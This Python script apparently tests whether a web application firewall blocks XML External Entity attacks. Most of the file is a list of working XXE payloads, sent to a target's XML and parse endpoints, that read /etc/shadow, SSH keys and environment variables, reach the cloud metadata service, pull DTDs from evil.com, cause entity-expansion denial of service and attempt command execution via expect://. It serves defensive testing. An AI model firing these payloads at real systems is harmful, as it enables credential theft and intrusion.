#!/usr/bin/env python3
"""
XXE (XML 外部实体) 攻击测试脚本

覆盖注入点:
  - POST XML Body
  - POST JSON (某些框架会解析 JSON 中的 XML)
  - GET Query
  - Header / Cookie

Payload 来源: 文件读取、SSRF、拒绝服务、RCE 等 XXE 技巧。
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from test_base import WAFTestBase, parse_args, Colors


class XXETester(WAFTestBase):
    ATTACK_NAME = "XML External Entity (XXE)"
    ATTACK_DESC = "XXE 攻击测试 — 文件读取、SSRF、DoS、RCE"

    # XML 基础 Payloads
    XML_PAYLOADS = [
        # 基础文件读取
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>\u0026xxe;</foo>''', "file-read-passwd"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<foo>\u0026xxe;</foo>''', "file-read-shadow"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<foo>\u0026xxe;</foo>''', "file-read-hosts"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<foo>\u0026xxe;</foo>''', "file-read-environ"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>
<foo>\u0026xxe;</foo>''', "file-read-ssh-key"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]>
<foo>\u0026xxe;</foo>''', "file-read-config"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
<foo>\u0026xxe;</foo>''', "file-read-win-ini"),

        # SSRF
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
<foo>\u0026xxe;</foo>''', "ssrf-local"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>\u0026xxe;</foo>''', "ssrf-metadata"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data">]>
<foo>\u0026xxe;</foo>''', "ssrf-user-data"),

        # 使用参数实体 (盲 XXE)
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
%xxe;]>
<foo>\u0026xxe;</foo>''', "blind-parameter"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY \u0026#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;]>
<foo></foo>''', "blind-error-based"),

        # DoS (Billion Laughs)
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;">
]>
<lolz>\u0026lol2;</lolz>''', "dos-billion-laughs"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY a0 "a">
<!ENTITY a1 "\u0026a0;\u0026a0;">
]>
<data>\u0026a1;</data>''', "dos-entity-expansion"),

        # 无 DTD (使用外部 DTD)
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">
<foo>\u0026xxe;</foo>''', "external-dtd"),

        # 编码绕过
        ('''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>\u0026xxe;</foo>''', "encoding-utf16"),

        ('''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>\u0026xxe;</foo>''', "encoding-iso"),

        # PHP 包装器
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../etc/passwd">]>
<foo>\u0026xxe;</foo>''', "php-wrapper"),

        # XInclude
        ('''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>''', "xinclude"),

        # SOAP XXE
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<foo>\u0026xxe;</foo>
</soap:Body>
</soap:Envelope>''', "soap-xxe"),

        # SVG XXE
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>\u0026xxe;</text>
</svg>''', "svg-xxe"),

        # Excel/OOXML
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData><row><c><v>\u0026xxe;</v></c></row></sheetData>
</worksheet>''', "ooxml-xxe"),

        # RCE (expect)
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>
<foo>\u0026xxe;</foo>''', "rce-expect"),

        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">]>
<foo>\u0026xxe;</foo>''', "rce-expect-cat"),
    ]

    def run(self):
        print(f"  {Colors.c('正在执行 XXE 测试...', Colors.INFO)}\n")

        print(f"  {Colors.c('[注入点] POST XML Body', Colors.CYAN)}")
        for xml_content, name in self.XML_PAYLOADS:
            self.send_and_record(
                f"xxe-xml-{name}", xml_content[:60], "POST", "/api/xml",
                expected_block=True, injection_point="POST-xml",
                data=xml_content, headers={"Content-Type": "application/xml"}
            )

        print(f"  {Colors.c('[注入点] POST JSON (XML in JSON)', Colors.CYAN)}")
        for xml_content, name in self.XML_PAYLOADS[:5]:
            self.post_json(
                f"xxe-json-{name}", xml_content, "/api/parse", "data"
            )

        print(f"  {Colors.c('[注入点] GET Query (XML string)', Colors.CYAN)}")
        for xml_content, name in self.XML_PAYLOADS[:5]:
            self.get_query(
                f"xxe-get-{name}", xml_content, "/api/parse", "xml"
            )


if __name__ == "__main__":
    args = parse_args("XXE 攻击测试")
    tester = XXETester(
        target=args.target, domain=args.domain,
        verbose=args.verbose, timeout=args.timeout, delay=args.delay
    )
    tester.execute()
